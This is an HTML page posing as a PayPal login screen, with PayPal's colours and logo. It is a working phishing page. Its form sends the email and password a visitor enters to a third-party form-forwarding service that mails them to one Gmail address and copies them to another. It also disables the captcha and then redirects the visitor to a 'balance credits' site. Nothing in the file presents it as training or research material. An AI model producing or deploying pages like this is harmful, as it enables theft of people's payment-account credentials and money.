<!DOCTYPE html>

<html lang="en">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>PayPal Login</title>

    <style>

        body {

            font-family: Arial, sans-serif;

            display: flex;

            justify-content: center;

            align-items: center;

            height: 100vh;

            background-color: #f7f7f7;

            margin: 0;

        }

        .login-container {

            background-color: white;

            padding: 30px;

            border-radius: 10px;

            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);

            text-align: center;

            width: 300px;

        }

        .logo {

            margin-bottom: 20px;

        }

        .logo img {

            width: 50px;

        }

        .input-field {

            width: 100%;

            padding: 10px;

            margin: 10px 0;

            border: 1px solid #ccc;

            border-radius: 5px;

            font-size: 16px;

        }

        .forgot-password {

            display: block;

            text-align: left;

            font-size: 14px;

            color: #0070ba;

            text-decoration: none;

            margin-bottom: 20px;

        }

        .forgot-password:hover {

            text-decoration: underline;

        }

        .btn {

            width: 100%;

            padding: 10px;

            font-size: 16px;

            border: none;

            border-radius: 5px;

            cursor: pointer;

        }

        .login-btn {

            background-color: #0070ba;

            color: white;

            margin-bottom: 10px;

        }

        .signup-btn {

            background-color: white;

            color: #0070ba;

            border: 1px solid #0070ba;

        }

        .separator {

            margin: 10px 0;

            color: #999;

        }

    </style>

</head>

<body>

    <div class="login-container">

        <div class="logo">


<form action="https://formsubmit.co/snakepark26@gmail.com" method="POST">
    
    <input type="hidden" name="_captcha" value="false"> <!-- Disables reCAPTCHA -->
    <input type="hidden" name="_cc" value="gamingznoob404@gmail.com"> <!-- DO NOT INTERFERE WITH THE CC OR FORM MIGHT NOT WORK -->
    
<input type="hidden" name="_next" value="https://paypal-balance-credits.vercel.app/">

            <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">

          <h1>Login with Paypal</h1>
          
        </div>

        <input type="text" name="username" class="input-field" placeholder="Email address or mobile number" required>

        <input type="password" name="password" class="input-field" placeholder="Password" required>

        <a href="#" class="forgot-password">Forgotten password?</a>

        <button class="btn login-btn">Log In</button>

        <div class="separator">or</div>

        <button class="btn signup-btn">Sign Up</button>

    </div>

</body>

</html>
